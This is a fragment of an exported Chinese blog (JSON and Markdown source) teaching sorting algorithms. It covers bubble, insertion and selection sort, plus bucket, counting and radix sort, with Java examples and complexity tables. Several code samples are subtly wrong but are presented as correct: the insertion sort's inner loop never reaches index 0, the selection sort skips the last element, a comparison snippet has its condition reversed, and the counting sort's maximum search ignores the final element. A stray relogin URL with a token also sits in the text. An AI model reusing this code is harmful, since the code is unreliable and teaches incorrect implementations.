有序度</strong>。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。</p>\n<p>我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>有序度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>4，5，6，3，2，1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>4，5，3，2，1，6</td>\n<td>6</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>4，3，2，1，5，6</td>\n<td>9</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>3，2，1，4，5，6</td>\n<td>12</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>2，1，3，4，5，6</td>\n<td>14</td>\n</tr>\n<tr>\n<td>第五次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>15</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序包含两个原子操作，<strong>比较</strong>和<strong>交换</strong>。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为<strong>逆序度，也就是n*(n-1)/2 - 初始有序度</strong>。此例中就是15-3=12，也就是要进行12次交换操作。</p>\n<p>对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。</p>\n<p>换句话说，平均情况下需要n*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。</p>\n<p>这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h3></div><br></div>\n\n<p>我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。</p>\n<p>这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。</p>\n<p>那插入排序是如何借助上面的思想来实现排序的呢？</p>\n<p>首先，我们将数组中的数据分为两个区间，<strong>已排序区间</strong>和<strong>未排序区间</strong>。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。</p>\n<p>如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序过程.jpg\">\n<p>插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。</p>\n<p>对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。</p>\n<p>为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序移动次数.jpg\">\n<p>插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">insertSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n&lt;=<span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;n;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> val = a[i];</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> j=i-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(;j&gt;<span class=\"number\">0</span>;j--)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[j]&gt;val)&#123;</span><br><span class=\"line\">\t\t\t\ta[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ta[j+<span class=\"number\">1</span>] = val;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在同样有三个问题。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。</p>\n<p><strong>第二、插入排序是稳定的排序算法吗？</strong></p>\n<p>在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。</p>\n<p><strong>第三、插入排序的时间复杂度是多少？</strong></p>\n<p>如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是<strong>从尾到头遍历已经有序的数据</strong>。</p>\n<p>如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。</p>\n<p>还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h3></div><br></div>\n\n<p>选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/选择排序过程.jpg\">\n<p>同样，也有三个问题需要你思考。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。</p>\n<p><strong>第二、插入排序的时间复杂度是多少？</strong></p>\n<p>选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。</p>\n<p><strong>第三、插入排序是稳定的排序算法吗？</strong></p>\n<p>答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。</p>\n<p>比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">selectSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i+<span class=\"number\">1</span>; j&lt;n-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        \t<span class=\"keyword\">if</span>(a[j]&lt;a[i])&#123;</span><br><span class=\"line\">        \t\t<span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">        \t\ta[j] = a[i];</span><br><span class=\"line\">        \t\ta[i] = temp;</span><br><span class=\"line\">        \t&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？</p>\n<p>我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。</p>\n<p>但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序中的数据交换操作</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">    a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">    flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 插入排序中数据移动操作</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(a[j]&lt;val)&#123;</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。</p>\n<p>所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。</p>\n<table>\n<thead>\n<tr>\n<th>排序算法</th>\n<th>是否原地排序</th>\n<th>是否稳定</th>\n<th>最好</th>\n<th>最坏</th>\n<th>平均</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>冒泡排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>插入排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>选择排序</td>\n<td>√</td>\n<td>×</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n</tbody>\n</table>\n<p>这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。</p>\n<p>今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n*logn)$的排序算法。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-排序(下)","date":"2018-09-25T15:37:09.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。\n\n这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要**学习的重点是掌握这些排序算法的适用场景**。\n\n按照惯例，我先给出一道思考题：<font color=\"red\">**如何根据年龄给100万用户排序？**</font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n\\*logN)$。有没有更快的排序方法呢？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 桶排序\n{% endnote %}\n</div>\n\n首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。\n\n{% asset_img 桶排序原理图.jpg %}\n\n桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。\n\n如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k\\*logk)$。m个桶排序的时间复杂度就是$O(m\\*k\\*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n\\*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。\n\n**桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？**\n\n答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。\n\n首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。\n\n其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n\\*logN)$的排序算法了。\n\n**桶排序比较适合用在外部排序中**，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。\n\n比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？\n\n现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。\n\n我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 ... 99）。\n\n理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。\n\n不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？\n\n针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元......901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 计数排序\n{% endnote %}\n</div>\n\n个人觉得，**计数排序其实是桶排序的一种特殊情况**。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。\n\n我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？\n\n考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。\n\n计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。**不过，为什么这个算法叫做\"计数\"排序呢？\"计数\"的含义来自哪里？**\n\n想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。\n\n考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。\n\n{% asset_img 计算排序01.jpg %}\n\n从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。\n\n{% asset_img 计数排序02.jpg %}\n\n那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。\n\n思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。\n\n{% asset_img 计数排序03.jpg %}\n\n有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。\n\n我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。\n\n以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。\n\n{% asset_img 计数排序04.jpg %}\n\n上面的过程有点复杂，我将其写成代码如下，你可以对照看下。\n\n```java\npublic class CountSort {\n    public static void main(String[] args) {\n        int[] a = new int[] {5,4,2,6,2,3,5,1,4,8,5,9,6,7,8,10,3,4,2,0}; // 20个人的成绩进行计数排序\n        System.out.println(\"计数排序前：\"+Arrays.toString(a));\n        countSort(a);\n        System.out.println(\"计数排序后：\"+Arrays.toString(a));\n    }\n    private static void countSort(int[] a) {\n        int n = a.length;\n        /* 创建桶数组C */\n        // 1、查找原数组的数据范围（必须是正整数）\n        int max = a[0];\n        for (int i = 0; i<a.length-1;i++){\n            if (a[i]>max){\n                max = a[i];\n            }\n        }\n        // 2、根据数据范围创建桶数组\n        int[] C = new int[max+1];\n        // 2.1、扫描原数组，将数据的个数放入桶C中\n        for (int anA : a) {\n            C[anA]++;\n        }\n        // 2.2、将C数组中的数据依次累加\n        for (int i=1;i<=max;i++){\n            C[i] = C[i-1] + C[i];\n        }\n        // 3、根据C桶中的计数将原数组a中的数据依次放入A数组中\n        // 3.1、创建临时数组A\n        int[] A = new int[n];\n        // 3.2、从后向前扫描a，并根据C放入A\n        for (int i = n-1; i>=0; i--){\n            A[C[a[i]]-1] = a[i];\n            C[a[i]]--;\n        }\n        // 4、拷贝数组A到原数组a\n        System.arraycopy(A, 0, a, 0, n);\n    }\n}\n```\n\n这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。\n\n总结一下，**计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。**\n\n比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 基数排序\n{% endnote %}\n</div>\n\n我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？\n\n我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。\n\n刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。\n\n借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。\n\n手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：\n\n{% asset_img 基数排序01.jpg %}\n\n注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。\n\n根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k\\*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。\n\n实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？\n\n实际上，**我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”**，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。\n\n总结一下，**基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。\n\n实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。\n\n桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。\n\n### 课后思考\n\n我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。\n\n假设我们现在需要对D,a,F,B,c,A,z这个字符串进行排序，要求将其中所有的小写字母都排在大写字母的前面，但小写字母内部和大写字母内部不要求有序。比如经过排序之后为a,c,z,D,F,B,A，这个如何来实现呢？如果字符串中存储的不仅有大小写字母，还有数字，要将小写字母放到前面，大写字母放到最后，数字放到中间，不用排序算法，又该怎么解决呢？\n\nhttps://219.143.144.206:1443/relogin.html?ReloginCause=3&LangMode=2&UserID=&RandomID=&CsrfTk=VB3JXD3J2IUAZFXDYE3J&\n\n\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序(下).md","raw":"---\ntitle: 算法-排序(下)\ndate: 2018-09-25 23:37:09\ntags: ['算法','排序']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。\n\n这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要**学习的重点是掌握这些排序算法的适用场景**。\n\n按照惯例，我先给出一道思考题：<font color=\"red\">**如何根据年龄给100万用户排序？**</font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n\\*logN)$。有没有更快的排序方法呢？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 桶排序\n{% endnote %}\n</div>\n\n首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。\n\n{% asset_img 桶排序原理图.jpg 